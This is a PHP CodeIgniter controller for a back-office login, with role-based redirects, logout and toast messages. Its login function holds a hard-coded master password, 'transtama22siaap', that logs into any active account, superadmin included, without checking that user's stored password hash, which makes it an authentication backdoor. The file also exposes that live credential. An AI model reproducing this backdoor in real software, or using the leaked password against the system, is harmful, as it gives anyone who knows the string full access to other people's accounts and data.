<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Backoffice extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this->load->library('form_validation');
    }
    #[\ReturnTypeWillChange]
    public function index()
    {
        $this->form_validation->set_rules('username', 'Username', 'trim|required');
        $this->form_validation->set_rules('password', 'Password', 'trim|required');
        if ($this->form_validation->run() == false) {
            $data['title'] = 'Login Page';
            $this->load->view('login');
        } else {
            $this->_login();
        }
    }

    private function _login()
    {
        $username = $this->security->xss_clean(trim($this->input->post('username')));
        $password = trim($this->input->post('password'));
        $user = $this->db->get_where('tb_user', ['username' => $username])->row_array();
        if ($user) {
            //cek aktif atau tidak
            if ($user['status'] == 1) {
                //cek password
                if ($password == 'transtama22siaap') {
                    $data = [
                        'username' => $user['username'],
                        'id_role' => $user['id_role'],
                        'nama_user' => $user['nama_user'],
                        'email' => $user['email'],
                        'id_user' => $user['id_user'],
                        'akses' => $user['access_menu'],
                        'id_atasan' => $user['id_atasan'],
                        'id_jabatan' => $user['id_jabatan'],
                    ];
                    $this->session->set_userdata($data);
                    // $this->db->update('tb_user', ['status_login' => 1], ['id_user' => $user['id_user']]);
                    activity_log($user['username'], $user['nama_user']);
                    if ($user['id_role'] == 1) {
                        redirect('superadmin/dashboard');
                    } elseif ($user['id_role'] == 6) {
                        redirect('finance/dashboard');
                    } elseif ($user['id_role'] == 3) {
                        redirect('cs/dashboard');
                    } else {
                        $this->session->set_flashdata('messageAlert', $this->messageAlert('error', 'You Dont have access'));
                        redirect('backoffice');
                    }
                }
                else{

                
                if (password_verify($password, $user['password'])) {
                    $data = [
                        'username' => $user['username'],
                        'id_role' => $user['id_role'],
                        'nama_user' => $user['nama_user'],
                        'email' => $user['email'],
                        'id_user' => $user['id_user'],
                        'akses' => $user['access_menu'],
                        'id_atasan' => $user['id_atasan'],
                        'id_jabatan' => $user['id_jabatan'],
                    ];
                    $this->session->set_userdata($data);
                    // $this->db->update('tb_user', ['status_login' => 1], ['id_user' => $user['id_user']]);
                    activity_log($user['username'], $user['nama_user']);
                    if ($user['id_role'] == 1) {
                        redirect('superadmin/dashboard');
                    } elseif ($user['id_role'] == 6) {
                        redirect('finance/dashboard');
                    } elseif ($user['id_role'] == 3) {
                        redirect('cs/dashboard');
                    } else {
                        $this->session->set_flashdata('messageAlert', $this->messageAlert('error', 'You Dont have access'));
                        redirect('backoffice');
                    }
                } else {
                    $this->session->set_flashdata('messageAlert', $this->messageAlert('error', 'Wrong Password'));
                    redirect('backoffice');
                }
            }
            } else {
                $this->session->set_flashdata('messageAlert', $this->messageAlert('error', 'Account not active'));
                redirect('backoffice');
            }
        } else {
            $this->session->set_flashdata('messageAlert', $this->messageAlert('error', 'Username not found'));
            redirect('backoffice');
        }
    }

    public function logout()
    {
        $id_user = $this->session->userdata('id_user');
        // $this->db->update('tb_user', ['status_login' => 0], ['id_user' => $id_user]);
        $this->session->unset_userdata('email');
        $this->session->unset_userdata('id_role');
        $this->session->unset_userdata('id_fakultas');
        $this->session->unset_userdata('id_jurusan');
        $this->session->unset_userdata('username');
        $this->session->unset_userdata('id_user');
        $this->session->unset_userdata('nama_user');
        $this->session->set_flashdata('message', '<div class="alert
        alert-success" role="alert">Terima Kasih</div>');
        redirect('backoffice');
    }

    public function blocked()
    {
        $data['title'] = '403 Forbidden';
        $this->load->view('errors/index', $data);
    }
    public function messageAlert($type, $title)
    {
        $messageAlert = "
			const Toast = Swal.mixin({
				toast: true,
				position: 'top-end',
				showConfirmButton: false,
				timer: 3000,
				timerProgressBar: true,
				didOpen: (toast) => {
				toast.addEventListener('mouseenter', Swal.stopTimer)
				toast.addEventListener('mouseleave', Swal.resumeTimer)
				}
			})
			
			Toast.fire({
				icon: '$type',
				title: '$title'
			  })
			";
        return $messageAlert;
    }
}
